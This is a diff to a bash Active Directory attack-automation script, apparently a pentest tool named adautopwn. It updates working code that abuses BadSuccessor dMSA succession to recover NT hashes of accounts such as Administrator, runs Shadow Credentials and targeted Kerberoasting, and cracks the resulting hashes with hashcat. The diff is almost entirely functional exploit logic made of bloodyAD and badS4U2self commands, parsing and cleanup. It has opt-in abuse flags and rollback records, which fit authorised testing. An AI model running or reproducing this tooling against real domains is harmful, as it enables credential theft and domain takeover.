@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.47.0"
+readonly VERSION="1.48.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -211,6 +211,8 @@ BADSUCCESSOR_FAC_OU=""            # OU DN that identity can create dMSA children
 BADSUCCESSOR_FAC_CC=""            # that identity's Kerberos ccache (needed for the S4U2self pull)
 declare -A SHARE_DROP_DONE=()     # "user:share" → writable-share payload drop already handled
 declare -A MEM_DUMP_DONE=()       # "share/path" → memory/disk-image backup already hashdumped
+SHADOWCRED_NOCA=0                 # set once PKINIT proves the domain has no CA → skip further Shadow Creds
+BS_NT=""                          # _bs_create_pull result (NT hash) — returned by global, not stdout
 declare -A DELETED_SID=()         # objectSid (lc) → "dn<TAB>sam" of an AD-Recycle-Bin object
 KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
 # Groups that mean "this account is effectively privileged" → crown it in the summary
@@ -410,6 +412,25 @@ queue_cred() {  # queue_cred <user> <password|""> <nthash|""> [via-technique]
     done
     CRED_QUEUE+=("${u}|${p}|${h}")
     loot "New identity queued for pivoting → ${C_BOLD}${u}${C_RESET}$( [[ -n "$p" ]] && echo " (password)" || echo " (NT hash)")"
+}
+
+# True (0) when we ALREADY hold a usable credential for <user> — owned/assessed,
+# an NT hash recovered into recovered_hashes.txt, or queued with a secret. Used to
+# skip redundant Kerberoast once (e.g.) BadSuccessor already yielded the NT hash.
+# Fully domain-agnostic: it keys off OUR runtime state, never off specific names.
+_have_creds_for() {
+    local u="${1,,}"; [[ -z "$u" ]] && return 1
+    u="${u%\$}"                                   # normalize trailing $ (machine accts)
+    [[ -n "${OWNED_GROUPS[$u]:-}" ]] && return 0  # already compromised/assessed
+    [[ -n "$OUTDIR" && -s "$OUTDIR/recovered_hashes.txt" ]] && \
+        grep -qiE "^${u//./\\.}(\\\$)?[[:space:]]" "$OUTDIR/recovered_hashes.txt" && return 0
+    local q qu qp qh ql
+    for q in "${CRED_QUEUE[@]}"; do
+        IFS='|' read -r qu qp qh <<<"$q"
+        ql="${qu,,}"; ql="${ql%\$}"
+        [[ "$ql" == "$u" && -n "$qp$qh" ]] && return 0
+    done
+    return 1
 }
 
 # Record any recovered plaintext password (with its provenance) for spraying + the map
@@ -1272,8 +1293,8 @@ phase_kerberoast() {
     if [[ -s "$outf" ]]; then
         loot "Kerberoast hashes captured!"
         while read -r h; do echo -e "      ${C_MAGENTA}${h:0:80}…${C_RESET}"; done <"$outf"
-        ok "Saved to kerberoast_hashes.txt (crack with: hashcat -m 13100)"
-        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 13100 "Kerberoast"
+        ok "Saved to kerberoast_hashes.txt (crack with: hashcat -m $(_krb_tgs_mode "$outf"))"
+        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" "$(_krb_tgs_mode "$outf")" "Kerberoast"
     else
         info "No Kerberoastable accounts found (no SPNs configured)"
     fi
@@ -3510,15 +3531,25 @@ _bs_kurl() {
     printf 'kerberos+ccache://%s%%5C%s:%s@%s/' "$DOMAIN" "$1" "$enc" "$DC_IP"
 }
 
-# S4U2self for a dMSA → echo the preceded account's NT hash. The hash is the
-# rc4_hmac key in the TGS "previous keys" block (aes keys are also 32/64 hex, so we
-# must key on the rc4 line, not any hex token).  <creator-user> <creator-ccache> <dmsa>
+# Extract the rc4_hmac key (= NT hash of the superseded account) from the
+# "previous keys found in TGS" block printed by EITHER `bloodyAD add badSuccessor`
+# (which does the S4U2self itself in 2.5.4+) OR a standalone `badS4U2self`. aes128 is
+# also 32-hex, so we MUST key on the rc4/arcfour LINE, not any hex token.  <text>
+_bs_parse_rc4() {
+    awk 'BEGIN{p=0} /previous keys found/{p=1}
+         p && tolower($0) ~ /rc4|arcfour/ { for(i=1;i<=NF;i++) if($i ~ /^[0-9a-fA-F]{32}$/){print $i; exit} }' <<<"$1"
+}
+
+# S4U2self for a dMSA → echo the preceded account's NT hash (FALLBACK path; the
+# primary path now parses bloodyAD's own output).  <creator-user> <creator-ccache> <dmsa>
 _badsuccessor_pull() {
+    have badS4U2self || return 1
     local kurl sout nt; kurl=$(_bs_kurl "$1" "$2")
-    run "badS4U2self '<ccache:$1>' 'krbtgt/${DOMAIN}@${DOMAIN}' '${3}\$@${DOMAIN}' --dmsa"
+    # log to stderr: this fn's STDOUT is captured by $() and must be ONLY the hash
+    run "badS4U2self '<ccache:$1>' 'krbtgt/${DOMAIN}@${DOMAIN}' '${3}\$@${DOMAIN}' --dmsa" >&2
     sout=$(badS4U2self "$kurl" "krbtgt/${DOMAIN}@${DOMAIN}" "${3}\$@${DOMAIN}" --dmsa 2>&1)
     printf '%s\n' "$sout" >>"$LOGFILE"
-    nt=$(awk 'BEGIN{p=0} /previous keys found/{p=1} p && tolower($0) ~ /rc4/{print $2; exit}' <<<"$sout")
+    nt=$(_bs_parse_rc4 "$sout")
     [[ "$nt" =~ ^[0-9a-fA-F]{32}$ ]] && { printf '%s' "$nt"; return 0; }
     return 1
 }
@@ -3545,38 +3576,86 @@ _abuse_badsuccessor() {
 
     if [[ "$DO_ABUSE" != "1" ]]; then
         info "  (report-only; --abuse to create a dMSA and recover a target's NT hash)"
-        detail "      bloodyAD ${ba[*]} add badSuccessor pwnmsa -t 'CN=Administrator,CN=Users,${base_dn}' --ou '${ou_dn}' --prepatch"
-        detail "      badS4U2self 'kerberos+ccache://${DOMAIN}%5C${USER}:<ccache>@${DC_IP}/' 'krbtgt/${DOMAIN}@${DOMAIN}' 'pwnmsa\$@${DOMAIN}' --dmsa"
+        detail "      # patched DC (>=26100.4946): NO --prepatch, bloodyAD writes the target's msDS-Superseded* + pulls the keys"
+        detail "      bloodyAD ${ba[*]} add badSuccessor pwnmsa -t 'CN=<victim>,${ou_dn}' --ou '${ou_dn}'"
+        detail "      # pre-26100.4946 DC fallback: add --prepatch, then  badS4U2self 'kerberos+ccache://${DOMAIN}%5C${USER}:<ccache>@${DC_IP}/' 'krbtgt/${DOMAIN}@${DOMAIN}' 'pwnmsa\$@${DOMAIN}' --dmsa"
         return
     fi
-    have bloodyAD && have badS4U2self || { warn "  need bloodyAD + badS4U2self (kerbad) for BadSuccessor"; return 1; }
-    [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" && -f "$KERB_TICKET" ]] || {
-        warn "  BadSuccessor S4U2self needs a TGT for ${USER} (-k mode); primitive registered, skipping live pull"; return 1; }
+    have bloodyAD || { warn "  need bloodyAD for BadSuccessor"; return 1; }
 
-    # UNPATCHED path: link a high-value target on our OWN dMSA (no write on target).
+    # Link a high-value target on a dMSA we create. On a PATCHED DC (>=26100.4946)
+    # bloodyAD must also write the target's msDS-Superseded* (so this only fully works
+    # for a target we can write — e.g. Administrator only on an UNPATCHED DC).
     local -a targets=()
     if [[ -n "${BADSUCCESSOR_TARGETS:-}" ]]; then read -r -a targets <<<"$BADSUCCESSOR_TARGETS"
     else targets=("CN=Administrator,CN=Users,${base_dn}"); fi
-    abuse_confirm "  Try BadSuccessor (unpatched path) from OU '${ou_dn}'?" || return 0
+    abuse_confirm "  Try BadSuccessor from OU '${ou_dn}'?" || return 0
     local t
     for t in "${targets[@]}"; do
         local tdisp; tdisp=$(grep -oiP '^CN=\K[^,]+' <<<"$t"); tdisp="${tdisp:-$t}"
-        local dmsa="pwnmsa$RANDOM" dn="CN=${dmsa},${ou_dn}"
-        run "bloodyAD ${ba[*]} add badSuccessor $dmsa -t '$t' --ou '$ou_dn' --prepatch"
-        local cout; cout=$(bloodyAD "${ba[@]}" add badSuccessor "$dmsa" -t "$t" --ou "$ou_dn" --prepatch 2>&1)
-        printf '%s\n' "$cout" >>"$LOGFILE"
-        _bloody_failed "$cout" && { warn "  dMSA creation failed → ${cout##*$'\n'}"; continue; }
-        rb_record "Created BadSuccessor dMSA $dn" "bloodyAD ${ba[*]} remove object '$dn'"
-        local nt; nt=$(_badsuccessor_pull "$USER" "$KERB_TICKET" "$dmsa")
-        bloodyAD "${ba[@]}" remove object "$dn" >>"$LOGFILE" 2>&1 && info "  cleaned up $dn"
-        if [[ -n "$nt" ]]; then
-            loot "★ BadSuccessor (unpatched) recovered NT hash of ${C_BOLD}${tdisp}${C_RESET}: ${C_MAGENTA}${nt}${C_RESET}"
+        _bs_create_pull "ba" "$t" "$ou_dn" "$USER" "$KERB_TICKET"; local nt="$BS_NT"
+        if [[ "$nt" =~ ^[0-9a-fA-F]{32}$ ]]; then
+            loot "★ BadSuccessor recovered NT hash of ${C_BOLD}${tdisp}${C_RESET}: ${C_MAGENTA}${nt}${C_RESET}"
             note_cred_source "$tdisp" "BadSuccessor dMSA succession (NT hash)"
             queue_cred "$tdisp" "" "$nt" "BadSuccessor"; return 0
         fi
-        warn "  no keys for ${tdisp} — DC likely patched; cross-identity mark path will handle writable victims"
+        warn "  no keys for ${tdisp} (need write on the target on a patched DC, or a pre-26100.4946 DC for the Administrator path) — writable-victim mark path will cover the rest"
     done
     return 0
+}
+
+# Run `add badSuccessor` for ONE creator identity against ONE target DN, recover the
+# target's NT hash, and clean up. Tries the PATCHED method first (no --prepatch →
+# bloodyAD writes the target's msDS-Superseded* itself and prints the previous keys),
+# then falls back to --prepatch + standalone badS4U2self for pre-26100.4946 DCs.
+#   $1 = name of the bloody-auth array  $2 = target DN  $3 = OU DN
+#   $4 = creator sAMAccountName (for badS4U2self)  $5 = creator ccache (for badS4U2self)
+# Result: sets global BS_NT to the 32-hex NT hash on success (NOT echoed — this fn
+# logs via run()/stdout, so a $()-capture would swallow the [>] lines AND merge them
+# into the returned hash). Callers: `_bs_create_pull ...; nt="$BS_NT"`.
+_bs_create_pull() {
+    local -n _auth="$1"; local tdn="$2" ou="$3" cuser="$4" cccache="$5"
+    local dmsa="pwnmsa$RANDOM" dn="CN=${dmsa},${ou}" out nt=""
+    BS_NT=""
+
+    # 1) PATCHED-DC path (default, no --prepatch): does create + Superseded* writes +
+    #    S4U2self and prints the keys. Avoids KRB_ERR_GENERIC on 26100.4946+ DCs.
+    run "bloodyAD ${_auth[*]} add badSuccessor $dmsa -t '$tdn' --ou '$ou'"
+    out=$(bloodyAD "${_auth[@]}" add badSuccessor "$dmsa" -t "$tdn" --ou "$ou" 2>&1)
+    printf '%s\n' "$out" >>"$LOGFILE"
+    nt=$(_bs_parse_rc4 "$out")
+    # DC sometimes needs a moment to honour the succession → one badS4U2self retry.
+    if [[ ! "$nt" =~ ^[0-9a-fA-F]{32}$ ]] && [[ -n "$cccache" && -f "$cccache" ]] && have badS4U2self; then
+        sleep 2; nt=$(_badsuccessor_pull "$cuser" "$cccache" "$dmsa")
+    fi
+    # Cleanup for the patched path ALSO clears the target's msDS-Superseded* (bloodyAD
+    # wrote them on the target — leaving them points the victim at a deleted dMSA).
+    if [[ "$nt" =~ ^[0-9a-fA-F]{32}$ ]]; then
+        rb_record "Created BadSuccessor dMSA $dn (+ marked target superseded)" \
+                  "bloodyAD ${_auth[*]} remove object '$dn'; bloodyAD ${_auth[*]} set object '$tdn' msDS-SupersededManagedAccountLink; bloodyAD ${_auth[*]} set object '$tdn' msDS-SupersededServiceAccountState"
+        bloodyAD "${_auth[@]}" remove object "$dn" >>"$LOGFILE" 2>&1
+        bloodyAD "${_auth[@]}" set object "$tdn" msDS-SupersededManagedAccountLink >>"$LOGFILE" 2>&1
+        bloodyAD "${_auth[@]}" set object "$tdn" msDS-SupersededServiceAccountState >>"$LOGFILE" 2>&1
+        BS_NT="$nt"; return 0
+    fi
+    bloodyAD "${_auth[@]}" remove object "$dn" >>"$LOGFILE" 2>&1   # clean the patched attempt
+    bloodyAD "${_auth[@]}" set object "$tdn" msDS-SupersededManagedAccountLink >>"$LOGFILE" 2>&1
+    bloodyAD "${_auth[@]}" set object "$tdn" msDS-SupersededServiceAccountState >>"$LOGFILE" 2>&1
+
+    # 2) UNPATCHED fallback (--prepatch): only valid on pre-26100.4946 DCs, needs a TGT.
+    [[ -n "$cccache" && -f "$cccache" ]] && have badS4U2self || return 1
+    dmsa="pwnmsa$RANDOM"; dn="CN=${dmsa},${ou}"
+    run "bloodyAD ${_auth[*]} add badSuccessor $dmsa -t '$tdn' --ou '$ou' --prepatch"
+    out=$(bloodyAD "${_auth[@]}" add badSuccessor "$dmsa" -t "$tdn" --ou "$ou" --prepatch 2>&1)
+    printf '%s\n' "$out" >>"$LOGFILE"
+    nt=$(_bs_parse_rc4 "$out"); [[ "$nt" =~ ^[0-9a-fA-F]{32}$ ]] || nt=$(_badsuccessor_pull "$cuser" "$cccache" "$dmsa")
+    if [[ "$nt" =~ ^[0-9a-fA-F]{32}$ ]]; then
+        rb_record "Created BadSuccessor dMSA $dn" "bloodyAD ${_auth[*]} remove object '$dn'"
+        bloodyAD "${_auth[@]}" remove object "$dn" >>"$LOGFILE" 2>&1
+        BS_NT="$nt"; return 0
+    fi
+    bloodyAD "${_auth[@]}" remove object "$dn" >>"$LOGFILE" 2>&1
+    return 1
 }
 
 # Marker side (patched DC / cross-identity): the CURRENT identity can write a
@@ -3594,35 +3673,48 @@ _badsuccessor_mark_and_pull() {
     local vdn; vdn=$(bloodyAD "${ba[@]}" get object "$victim" --attr distinguishedName 2>/dev/null \
                      | grep -oiP 'distinguishedName:\s*\K\S.*' | head -1)
     [[ -z "$vdn" ]] && return 1
-    abuse_confirm "  BadSuccessor-mark '${victim}' (link a dMSA from ${BADSUCCESSOR_FAC_USER}) to recover its hash without a reset?" || return 1
+    abuse_confirm "  BadSuccessor-mark '${victim}' (dMSA succession via ${BADSUCCESSOR_FAC_USER}, no reset)?" || return 1
 
-    local dmsa="pwnmsa$RANDOM" dn="CN=${dmsa},${BADSUCCESSOR_FAC_OU}"
-    local cba=(--host "$DCT" --dc-ip "$DC_IP" -d "$DOMAIN" -u "$BADSUCCESSOR_FAC_USER" -k)
+    local nt=""
+    # Case A — ONE identity holds BOTH rights: it is the factory (CREATE_CHILD on the
+    # OU) AND can write the victim's msDS-Superseded* (e.g. alex.turner on Checkpoint).
+    # A single no-prepatch `add badSuccessor -t <victim>` then does create + mark +
+    # S4U2self and prints the keys. This is the path that was failing on --prepatch.
+    if [[ "${BADSUCCESSOR_FAC_USER,,}" == "${USER,,}" ]]; then
+        _bs_create_pull "ba" "$vdn" "$BADSUCCESSOR_FAC_OU" "$USER" "$KERB_TICKET"; nt="$BS_NT"
+    fi
 
-    # 1) factory creates the dMSA + links the victim on the dMSA side (--prepatch)
-    run "KRB5CCNAME=<factory:$BADSUCCESSOR_FAC_USER> bloodyAD add badSuccessor $dmsa -t '$vdn' --ou '$BADSUCCESSOR_FAC_OU' --prepatch"
-    local c1; c1=$(KRB5CCNAME="$BADSUCCESSOR_FAC_CC" bloodyAD "${cba[@]}" add badSuccessor "$dmsa" -t "$vdn" --ou "$BADSUCCESSOR_FAC_OU" --prepatch 2>&1)
-    printf '%s\n' "$c1" >>"$LOGFILE"
-    _bloody_failed "$c1" && { warn "  factory ${BADSUCCESSOR_FAC_USER} could not create dMSA → ${c1##*$'\n'}"; return 1; }
-    rb_record "Created BadSuccessor dMSA $dn (factory $BADSUCCESSOR_FAC_USER)" \
-              "KRB5CCNAME=$BADSUCCESSOR_FAC_CC bloodyAD ${cba[*]} remove object '$dn'"
+    # Case B — TRUE cross-identity (factory cannot write the victim): factory creates
+    # the dMSA with --prepatch (its internal S4U2self errors BEFORE the victim is
+    # marked — fine, the object is created), the victim-writer sets the victim's
+    # msDS-Superseded*, then the factory pulls the keys with badS4U2self.
+    if [[ ! "$nt" =~ ^[0-9a-fA-F]{32}$ ]] && [[ -f "$BADSUCCESSOR_FAC_CC" ]] && have badS4U2self; then
+        local cba=(--host "$DCT" --dc-ip "$DC_IP" -d "$DOMAIN" -u "$BADSUCCESSOR_FAC_USER" -k)
+        local dmsa="pwnmsa$RANDOM" dn="CN=${dmsa},${BADSUCCESSOR_FAC_OU}"
+        run "KRB5CCNAME=<factory:$BADSUCCESSOR_FAC_USER> bloodyAD add badSuccessor $dmsa -t '$vdn' --ou '$BADSUCCESSOR_FAC_OU' --prepatch"
+        KRB5CCNAME="$BADSUCCESSOR_FAC_CC" bloodyAD "${cba[@]}" add badSuccessor "$dmsa" -t "$vdn" --ou "$BADSUCCESSOR_FAC_OU" --prepatch >>"$LOGFILE" 2>&1
+        # The internal S4U2self may have errored under --prepatch — verify the OBJECT exists.
+        if KRB5CCNAME="$BADSUCCESSOR_FAC_CC" bloodyAD "${cba[@]}" get object "$dn" --attr sAMAccountName >>"$LOGFILE" 2>&1; then
+            rb_record "Created BadSuccessor dMSA $dn (factory $BADSUCCESSOR_FAC_USER)" \
+                      "KRB5CCNAME=$BADSUCCESSOR_FAC_CC bloodyAD ${cba[*]} remove object '$dn'"
+            run "bloodyAD ${ba[*]} set object '$victim' msDS-SupersededManagedAccountLink -v '$dn' (+ State 2)"
+            bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededManagedAccountLink -v "$dn" >>"$LOGFILE" 2>&1
+            bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededServiceAccountState -v 2     >>"$LOGFILE" 2>&1
+            rb_record "Marked $victim superseded by $dn" \
+                      "bloodyAD ${ba[*]} set object '$victim' msDS-SupersededManagedAccountLink; bloodyAD ${ba[*]} set object '$victim' msDS-SupersededServiceAccountState"
+            sleep 2
+            nt=$(_badsuccessor_pull "$BADSUCCESSOR_FAC_USER" "$BADSUCCESSOR_FAC_CC" "$dmsa")
+            KRB5CCNAME="$BADSUCCESSOR_FAC_CC" bloodyAD "${cba[@]}" remove object "$dn" >>"$LOGFILE" 2>&1
+            bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededManagedAccountLink  >>"$LOGFILE" 2>&1
+            bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededServiceAccountState  >>"$LOGFILE" 2>&1
+        else
+            warn "  factory ${BADSUCCESSOR_FAC_USER} could not create the dMSA"
+        fi
+    fi
 
-    # 2) current identity links the dMSA back on the VICTIM side (msDS-Superseded*)
-    run "bloodyAD ${ba[*]} set object '$victim' msDS-SupersededManagedAccountLink -v '$dn' (+ ...State -v 2)"
-    bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededManagedAccountLink -v "$dn"  >>"$LOGFILE" 2>&1
-    bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededServiceAccountState -v 2      >>"$LOGFILE" 2>&1
-    rb_record "Marked $victim superseded by $dn" \
-              "bloodyAD ${ba[*]} set object '$victim' msDS-SupersededManagedAccountLink; bloodyAD ${ba[*]} set object '$victim' msDS-SupersededServiceAccountState"
-
-    # 3) factory pulls the keys, then everything is cleaned up (best-effort)
-    local nt; nt=$(_badsuccessor_pull "$BADSUCCESSOR_FAC_USER" "$BADSUCCESSOR_FAC_CC" "$dmsa")
-    KRB5CCNAME="$BADSUCCESSOR_FAC_CC" bloodyAD "${cba[@]}" remove object "$dn" >>"$LOGFILE" 2>&1
-    bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededManagedAccountLink  >>"$LOGFILE" 2>&1
-    bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededServiceAccountState  >>"$LOGFILE" 2>&1
-
-    if [[ -n "$nt" ]]; then
-        loot "★ BadSuccessor (cross-identity) recovered NT hash of ${C_BOLD}${victim}${C_RESET}: ${C_MAGENTA}${nt}${C_RESET}"
-        note_cred_source "$victim" "BadSuccessor cross-identity (mark via ${BADSUCCESSOR_FAC_USER} + dMSA succession)"
+    if [[ "$nt" =~ ^[0-9a-fA-F]{32}$ ]]; then
+        loot "★ BadSuccessor recovered NT hash of ${C_BOLD}${victim}${C_RESET}: ${C_MAGENTA}${nt}${C_RESET}"
+        note_cred_source "$victim" "BadSuccessor dMSA succession (no reset)"
         queue_cred "$victim" "" "$nt" "BadSuccessor"
         return 0
     fi
@@ -3729,6 +3821,13 @@ _abuse_shadowcred() {
     local target="$1"
     { have certipy || have bloodyAD; } || return 1
     [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try Shadow Credentials on '$target')"; return 1; }
+    # Shadow Credentials needs PKINIT, which needs an enterprise CA / KDC cert. Once a
+    # prior attempt proved there's none, skip the rest (saves a noisy doomed retry per
+    # identity and avoids littering orphan KeyCredentials).
+    if [[ "$SHADOWCRED_NOCA" == "1" ]]; then
+        info "  Shadow Credentials skipped — domain has no CA / KDC cert (PKINIT impossible here)"
+        return 1
+    fi
     # Dedup: if we already recovered this target's hash (another ACL path / BH edge
     # in this run), don't re-run the whole flow — it's slow and just spams duplicate
     # output. One success per target is enough.
@@ -3775,6 +3874,16 @@ _abuse_shadowcred() {
         local -a ba2; mapfile -t ba2 < <(bloody_args)
         run "bloodyAD ${ba2[*]} add shadowCredentials '$target'"
         local bo; bo=$( cd "$OUTDIR" && bloodyAD "${ba2[@]}" add shadowCredentials "$target" 2>&1 ); echo "$bo" | tee -a "$LOGFILE"
+        # No CA in the domain → PKINIT can't run, so Shadow Creds can NEVER yield a hash
+        # here. bloodyAD may still have WRITTEN the KeyCredential before failing → roll it
+        # back, flag the domain, and stop trying Shadow Creds for every later identity.
+        if grep -qiE 'certification authority|PKINIT failed|no.*KDC.*cert|find a Kerberos server' <<<"$bo"; then
+            SHADOWCRED_NOCA=1
+            warn "  No CA/KDC cert in domain → Shadow Credentials can't recover a hash (PKINIT). Rolling back the KeyCredential on $target."
+            bloodyAD "${ba2[@]}" remove shadowCredentials "$target" >>"$LOGFILE" 2>&1
+            rm -f "$OUTDIR/${target}"*.pfx 2>/dev/null
+            return 1
+        fi
         # Only parse a hash if it ACTUALLY succeeded. bloodyAD prints a 64-char
         # "sha256 of RSA key" line during key generation even when the LDAP write is
         # then refused (insufficient rights) — a greedy [0-9a-f]{32} would slice that
@@ -3849,6 +3958,12 @@ _abuse_rbcd() {
 _abuse_writespn() {
     local target="$1"; local ba pba; mapfile -t ba < <(bloody_args)
     [[ "$CAP_KERBEROS" != "1" ]] && return
+    # Already own this principal (e.g. BadSuccessor / Shadow Creds already gave its
+    # NT hash) → roasting + cracking it again is pure noise. Skip it.
+    if _have_creds_for "$target"; then
+        info "WriteSPN over '${C_BOLD}$target${C_RESET}' → ${C_DIM}skipped: already hold its credentials${C_RESET}"
+        return
+    fi
     warn "WriteSPN over '${C_BOLD}$target${C_RESET}' → targeted Kerberoast possible"
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to set a temp SPN and roast '$target')"; return; }
     abuse_confirm "  Set a temporary SPN on '$target' and Kerberoast it?" || return
@@ -3886,7 +4001,7 @@ _abuse_writespn() {
         if [[ -s "$outf" ]]; then
             loot "★ WriteSPN Kerberoast hash captured for $target"
             cat "$outf" >>"$OUTDIR/kerberoast_hashes.txt"
-            [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 13100 "Kerberoast"
+            [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" "$(_krb_tgs_mode "$outf")" "Kerberoast"
         fi
         bloodyAD "${rba[@]}" remove object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" >/dev/null
         ok "Temporary SPN removed from $target"
@@ -5247,6 +5362,14 @@ gen_domain_wordlist() {
 # ===========================================================================
 #  OFFLINE CRACKING  (hashcat + wordlist)
 # ===========================================================================
+# Pick the hashcat mode for a Kerberoast TGS hash by its etype: 23=RC4 (13100),
+# 17=AES128 (19600), 18=AES256 (19700). Modern DCs hand out AES by default, so a
+# hardcoded 13100 makes hashcat reject the "$krb5tgs$18$…" hash ("Separator unmatched").
+_krb_tgs_mode() {
+    local et; et=$(grep -oiE '\$krb5tgs\$[0-9]+' "$1" 2>/dev/null | grep -oE '[0-9]+$' | head -1)
+    case "$et" in 17) echo 19600;; 18) echo 19700;; *) echo 13100;; esac
+}
+
 crack_hashes() {
     local file="$1" mode="$2" label="$3"
     [[ ! -s "$file" ]] && return
@@ -5261,7 +5384,7 @@ crack_hashes() {
         [[ -z "$line" ]] && continue
         case "$label" in
             AS-REP)     k=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@:]+' <<<"$line" | head -1) ;;
-            Kerberoast) k=$(grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+'  <<<"$line" | head -1) ;;
+            Kerberoast) k=$(grep -oP '\$krb5tgs\$[0-9]+\$\*?\K[^$*]+'  <<<"$line" | head -1) ;;
             Timeroast)  k=$(grep -oP '\$sntp-ms\$[^$]*\$\K[^$: ]+'     <<<"$line" | head -1) ;;
             *)          k="$line" ;;
         esac
@@ -5278,18 +5401,26 @@ crack_hashes() {
     fi
 
     subsection "Cracking $label (hashcat -m $mode)"
+    # Hashcat's progress noise (Status/Speed/Started/Stopped/potfile banners) is sent
+    # ONLY to the logfile — the terminal stays clean and just shows the verdict below
+    # (cracked creds in green, or "Nothing cracked"). Full output still in adautopwn.log.
     # 1) domain-focused candidates first (fast, high hit-rate), then rockyou
     if [[ -s "$DOMAIN_WL" ]]; then
         run "hashcat -m $mode <file> domain_wordlist.txt -O"
-        hashcat -m "$mode" "$work" "$DOMAIN_WL" -O 2>&1 | tee -a "$LOGFILE"
+        hashcat -m "$mode" "$work" "$DOMAIN_WL" -O >>"$LOGFILE" 2>&1
     fi
     if [[ -f "$WORDLIST" ]]; then
         run "hashcat -m $mode <file> $WORDLIST -O"
-        hashcat -m "$mode" "$work" "$WORDLIST" -O 2>&1 | tee -a "$LOGFILE"
+        hashcat -m "$mode" "$work" "$WORDLIST" -O >>"$LOGFILE" 2>&1
     elif [[ ! -s "$DOMAIN_WL" ]]; then
         warn "No wordlist available, skipping $label cracking"; rm -f "$work"; return
     fi
-    local cracked; cracked=$(hashcat -m "$mode" "$work" --show 2>/dev/null); rm -f "$work"
+    # `--show` prints parser errors ("Separator unmatched", "No hashes loaded"…) to
+    # STDOUT too, so a wrong -m would otherwise be reported as a "cracked" credential.
+    # Keep only real potfile lines (hash<colon>plaintext), dropping hashcat chatter.
+    local cracked; cracked=$(hashcat -m "$mode" "$work" --show 2>/dev/null \
+        | grep -viE 'Separator unmatched|Hashfile|No hashes|hashes loaded|Parsing|Count(ing|ed) lines|^Started:|^Stopped:' \
+        | grep ':'); rm -f "$work"
     if [[ -n "$cracked" ]]; then
         loot "★★★ CRACKED CREDENTIALS ($label) ★★★"
         echo "$cracked" | while IFS= read -r line; do echo -e "      ${C_GREEN}${C_BOLD}$line${C_RESET}"; done
@@ -5301,7 +5432,7 @@ crack_hashes() {
             add_secret "$pw" "cracked $label hash"
             case "$label" in
                 AS-REP)     user=$(echo "$line" | grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+') ;;
-                Kerberoast) user=$(echo "$line" | grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+') ;;
+                Kerberoast) user=$(echo "$line" | grep -oP '\$krb5tgs\$[0-9]+\$\*?\K[^$*]+') ;;
                 Timeroast)  user=$(echo "$line" | grep -oP '\$sntp-ms\$[^$]*\$\K[^$: ]+' | head -1) ;;
                 NTLM)       # map NT hash back to a username via the DCSync output
                     local nt="${line%%:*}"
@@ -6614,10 +6745,10 @@ final_summary() {
             # One entry per SPN account: the same account roasted across rounds yields
             # different (nonce-varied) hashes — show it once, not duplicated.
             local _kr; _kr=$(grep -i krb5tgs "$OUTDIR/kerberoast_hashes.txt" | while IFS= read -r h; do
-                printf '%s|%s\n' "$(grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+' <<<"$h")" "$h"; done \
+                printf '%s|%s\n' "$(grep -oiP '\$krb5tgs\$[0-9]+\$\*?\K[^$*]+' <<<"$h")" "$h"; done \
                 | sort -t'|' -k1,1 -u | cut -d'|' -f2-)
             detail "  ${C_BOLD}${C_YELLOW}» Kerberoastable${C_RESET} ${C_DIM}($(printf '%s\n' "$_kr" | grep -c .) — hashcat -m 13100)${C_RESET}"
-            while IFS= read -r h; do [[ -z "$h" ]] && continue; local w; w=$(echo "$h" | grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+')
+            while IFS= read -r h; do [[ -z "$h" ]] && continue; local w; w=$(echo "$h" | grep -oiP '\$krb5tgs\$[0-9]+\$\*?\K[^$*]+')
                 detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(printf '%s\n' "$_kr")
         fi
 
@@ -6735,8 +6866,14 @@ assess_current_credential() {
     phase_sccm;         jitter
     phase_wsus;         jitter
     phase_winrm_dpapi;  jitter
-    phase_acl;          jitter
+    # Account lifecycle runs BEFORE ACL/Kerberoast on purpose: restoring a deleted
+    # target (e.g. a tombstoned mark.davies in the AD Recycle Bin) or re-enabling a
+    # disabled one makes it appear LIVE in the writable set, so phase_acl's Shadow
+    # Credentials / WriteSPN / BadSuccessor hit the REAL object. Run after acl, the
+    # ACL phase abused the unusable tombstone (CN=...\0ADEL:...,CN=Deleted Objects)
+    # and silently recovered no keys — then the restore happened too late to pivot.
     phase_recycle_disabled; jitter
+    phase_acl;          jitter
     phase_relay;        jitter
     phase_trusts;       jitter
     phase_rodc_abuse;   jitter
